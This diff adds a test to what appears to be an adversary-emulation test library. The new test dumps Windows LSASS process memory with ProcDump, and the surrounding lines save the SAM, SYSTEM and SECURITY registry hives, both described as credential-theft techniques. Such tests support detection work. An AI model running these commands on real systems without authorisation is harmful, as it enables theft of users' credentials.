@@ -55,3 +55,21 @@ atomic_tests:
       reg save HKLM\sam sam
       reg save HKLM\system system
       reg save HKLM\security security
+
+
+- name: Dump LSASS.exe Memory using ProcDump
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals 
+    ProcDump. The tool may be downloaded from https://docs.microsoft.com/en-us/sysinternals/downloads/procdump.
+  supported_platforms:
+    - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: lsass_dump.dmp
+  executor:
+    name: command_prompt
+    command: |
+      procdump.exe -accepteula -ma lsass.exe #{output_file}
+
